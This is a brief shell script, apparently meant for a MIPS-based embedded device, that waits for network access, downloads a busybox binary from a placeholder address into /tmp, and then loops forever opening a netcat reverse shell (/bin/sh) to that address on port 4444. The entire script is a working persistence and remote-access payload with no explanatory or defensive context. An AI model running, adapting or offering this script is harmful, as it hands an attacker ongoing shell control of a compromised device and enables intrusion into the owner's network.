#!/bin/sh

# Wait until we have internet
while ! ping -c 1 google.com;
do
    sleep 1
done

cd /tmp
wget http://YOUR_IP_HERE/busybox-mipsel
chmod +x busybox-mipsel

while true;
do
    ./busybox-mipsel nc YOUR_IP_HERE 4444 -e /bin/sh
    sleep 120
done
